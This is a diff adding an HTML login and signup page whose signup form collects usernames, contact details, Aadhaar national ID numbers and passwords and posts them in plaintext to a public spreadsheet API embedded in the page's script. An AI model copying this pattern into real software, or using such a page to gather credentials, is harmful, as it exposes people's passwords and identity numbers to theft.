@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium Login & Signup</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #6a11cb, #2575fc);
+        }
+        .popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            width: 400px;
+            background: #fff;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            padding: 20px;
+            opacity: 0;
+            transition: transform 0.3s ease, opacity 0.3s ease;
+        }
+        .popup.active {
+            transform: translate(-50%, -50%) scale(1);
+            opacity: 1;
+        }
+        .popup-header {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        .popup-form input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .popup-form button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            background: #2575fc;
+            color: #fff;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        .popup-form button:hover {
+            background: #1e5fcc;
+        }
+        .trigger-buttons {
+            display: flex;
+            gap: 10px;
+        }
+        .trigger-buttons button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        .trigger-buttons .login {
+            background: #2575fc;
+            color: #fff;
+        }
+        .trigger-buttons .login:hover {
+            background: #1e5fcc;
+        }
+        .trigger-buttons .signup {
+            background: #6a11cb;
+            color: #fff;
+        }
+        .trigger-buttons .signup:hover {
+            background: #590fa6;
+        }
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 20px;
+            color: #333;
+            cursor: pointer;
+        }
+        /* Loading Overlay Styles */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            font-size: 24px;
+            z-index: 1000;
+            display: none; /* Hidden by default */
+        }
+        .loading-overlay.active {
+            display: flex; /* Show when active */
+        }
+    </style>
+</head>
+<body>
+
+    <div class="trigger-buttons">
+        <button class="login" onclick="showPopup('login-popup')">Login</button>
+        <button class="signup" onclick="showPopup('signup-popup')">Signup</button>
+    </div>
+
+    <div id="login-popup" class="popup">
+        <span class="close-btn" onclick="closePopup('login-popup')">&times;</span>
+        <div class="popup-header">Login</div>
+        <form class="popup-form" id="login-form">
+            <input type="email" placeholder="Email" required>
+            <input type="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+
+    <div id="signup-popup" class="popup">
+        <span class="close-btn" onclick="closePopup('signup-popup')">&times;</span>
+        <div class="popup-header">Signup</div>
+        <form class="popup-form" id="signup-form">
+            <div>
+                <label for="Username">Username:</label>
+                <input type="text" id="Username" placeholder="Enter Your Username" required>
+            </div>
+            <div>
+                <label for="email-or-phone">Email or Phone Number:</label>
+                <input type="text" id="email-or-phone" placeholder="Email or Phone Number" required>
+            </div>
+            <div>
+                <label for="AadharNo">Aadhar No:</label>
+                <input type="text" id="AadharNo" placeholder="Aadhaar Number" required>
+            </div>
+            <div>
+                <label for="Password">Password:</label>
+                <input type="password" id="Password" placeholder="Password" required>
+            </div>
+            <button type="submit">Signup</button>
+        </form>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loading-overlay">
+        <div>Loading...</div>
+    </div>
+
+    <script>
+        function showPopup(popupId) {
+            document.getElementById(popupId).classList.add('active');
+        }
+
+        function closePopup(popupId) {
+            document.getElementById(popupId).classList.remove('active');
+        }
+
+        document.getElementById('login-form').addEventListener('submit', function (e) {
+            e.preventDefault();
+            alert('Login functionality to be implemented.');
+            closePopup('login-popup');
+        });
+
+        document.getElementById('signup-form').addEventListener('submit', async function (e) {
+            e.preventDefault();
+
+            const Username = document.getElementById('Username').value.trim();
+            const MailorNumber = document.getElementById('email-or-phone').value.trim();
+            const AadharNo = document.getElementById('AadharNo').value.trim();
+            const password = document.getElementById('Password').value.trim();
+
+            if (!Username || !MailorNumber || !AadharNo || !password) {
+                alert('Please fill all fields.');
+                return;
+            }
+
+           
+            const loadingOverlay = document.getElementById('loading-overlay');
+            loadingOverlay.classList.add('active');
+
+            try {
+                const apiResponse = await fetch('https://sheetdb.io/api/v1/zedneegr20w1h', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        data: [{
+                            username: Username,
+                            MailorNumber: MailorNumber,
+                            AadharNo: AadharNo,
+                            password: password
+                        }]
+                    }),
+                });
+
+                const result = await apiResponse.json();
+
+                if (result.created === 1) {
+                    localStorage.setItem('Submitted', 'true');
+                    alert('Signup successful!');
+                    closePopup('signup-popup');
+                } else {
+                    throw new Error(result.error || "Failed to save results");
+                }
+            } catch (error) {
+                console.error("Error:", error);
+                alert('An error occurred. Please try again.');
+            } finally {
+               
+                loadingOverlay.classList.remove('active');
+            }
+        });
+    </script>
+</body>
+</html>
